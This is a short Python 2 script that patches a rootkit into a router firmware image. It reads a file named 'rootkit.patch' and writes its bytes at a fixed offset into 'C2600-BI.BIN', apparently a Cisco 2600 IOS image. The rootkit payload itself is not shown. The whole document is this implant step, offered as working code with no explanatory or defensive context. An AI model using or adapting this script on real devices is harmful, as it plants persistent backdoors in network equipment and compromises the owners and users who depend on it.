import shutil
with file('rootkit.patch','rb') as fd:
    rkpatch = fd.read()

with file('C2600-BI.BIN','r+b') as fd:
    fd.seek(0x1b60988)
    fd.write(rkpatch)
